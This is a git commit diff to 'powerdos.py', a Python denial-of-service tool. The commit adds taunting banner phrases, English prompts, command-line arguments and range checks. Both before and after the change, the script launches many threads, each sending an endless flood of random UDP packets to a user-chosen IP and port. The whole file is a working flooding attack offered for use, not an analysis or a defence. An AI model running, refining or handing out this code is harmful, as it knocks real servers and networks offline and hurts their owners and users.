f1d950ba1ea5de0c92f445ba21a5d649efeeddee
LeonardoSasaki <leonardosasakiofc@gmail.com>
2021-03-24 00:32:05 -0300

    Update powerdos.py

--- powerdos.py
+++ powerdos.py
@@ -4,47 +4,58 @@ import random
 import time
 import sys
 
-init = False
+ppl = ["Near Shelby", "Sasaki", "sysb1n", "Gr3n0xX", "Quiliarca", "Lucazz Dev", "vl0ne-$", "Xernoboy", "marreta cabeça de rato", "S4SUK3"]
+phrase = ["was here", "is watching you", "knows your name", "knows your location", "hacked NASA", "hacked FBI", "hacked you", "is looking 4 u", "is right behind you", "has hype"]
+
+def random_phrase():
+    return ppl[random.randint(0, len(ppl)-1)] + " " + phrase[random.randint(0, len(phrase)-1)]
 
 #Power-DoS banner
 def banner():
-	print("""\033[1;31m
+	print(f"""\033[1;31m
 	 ▄▀▀▄▀▀▀▄  ▄▀▀▀▀▄   ▄▀▀▄    ▄▀▀▄  ▄▀▀█▄▄▄▄  ▄▀▀▄▀▀▀▄      ▄▀▀█▄▄   ▄▀▀▀▀▄   ▄▀▀▀▀▄ 
 	█   █   █ █      █ █   █    ▐  █ ▐  ▄▀   ▐ █   █   █     █ ▄▀   █ █      █ █ █   ▐ 
 	▐  █▀▀▀▀  █      █ ▐  █        █   █▄▄▄▄▄  ▐  █▀▀█▀      ▐ █    █ █      █    ▀▄   
 	   █      ▀▄    ▄▀   █   ▄    █    █    ▌   ▄▀    █        █    █ ▀▄    ▄▀ ▀▄   █  
 	 ▄▀         ▀▀▀▀      ▀▄▀ ▀▄ ▄▀   ▄▀▄▄▄▄   █     █        ▄▀▄▄▄▄▀   ▀▀▀▀    █▀▀▀   
 	█                           ▀     █    ▐   ▐     ▐       █     ▐            ▐      
-	▐                                 ▐                      ▐                        
-		\033[4;33mVersion 1.0
-        	\033[4;33mCoded by Leonardo Sasaki
+	▐                                 ▐                      ▐ {random_phrase()}
+        
+        \033[2;33mVersion: 1.1 \t Coded by Leonardo Sasaki\n
 	""")
 
 def DoS(ip, port, size, index):
-	while init == False:
-		time.sleep(1)
 	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 	while True:
 		sock.sendto(random._urandom(size), (ip, port))
-		print(f"\033[1;32m[THREAD {index}] \xBB {size} bytes enviados para {ip}")
+		print(f"\033[1;32m[THREAD {index}] \xBB {size} bytes sent to {ip}")
 
-banner()
-#verifica a versão do python
-print("\033[1;32m\xBB Verificando a versão...")
-if sys.version_info < (3, 0):
-    print("\033[1;31mERRO!! Por favor, utilize python3")
-    sys.exit(1)
+def main():
+    banner()
 
-target_ip = input("\033[1;32mDigite o ip alvo: ")
-target_port = int(input("\033[1;32mDigite a porta alvo: "))
-target_size = int(input("\033[1;32mDigite o tamanho dos pacotes: "))
-thread_count = int(input("\033[1;32mDigite o número de threads a utilizar: "))
+    target_ip       = input("\033[2;32mEnter the target ip \xBB ") if len(sys.argv) < 2 else sys.argv[1]
+    target_port     = int(input("\033[2;32mEnter the target port \xBB ")) if len(sys.argv) < 3 else int(sys.argv[2])
+    target_size     = int(input("\033[2;32mEnter the packet size \xBB ")) if len(sys.argv) < 4 else int(sys.argv[3])
+    thread_count    = int(input("\033[2;32mEnter how many threads to use \xBB ")) if len(sys.argv) < 5 else int(sys.argv[4])
+    
+    if target_port > 65535 or target_port < 1:
+        print("\n\033[1;31m[ERROR] \xBB Please, choose a port between 1 and 65535")
+        sys.exit(1)
 
-for i in range(thread_count):
-	try:
-		thread = threading.Thread(target=DoS, args=(target_ip, target_port, target_size, i,))
-		thread.start()
-	except:
-		print(f"\033[1;31mErro ao inicializar a thread número {i} (Você escolheu muitas threads?)")
+    if target_size > 65500 or target_size < 1:
+        print("\n\033[1;31m[ERROR] \xBB Please, choose a size between 1 and 65500")
+        sys.exit(1)
 
-init = True
+    if thread_count > 0:
+        for i in range(thread_count):
+            try:
+                t = threading.Thread(target=DoS, args=(target_ip, target_port, target_size, i,))
+                t.start()
+            except:
+                print(f"\n\033[1;31m[ERRO] \xBB An error ocurred initializing thread {i} (Did you enter too much threads?)")
+    else:
+        print("\n\033[1;31m[ERRO] \xBB Please, enter at least 1 thread")
+
+
+if __name__ == "__main__":
+    main()
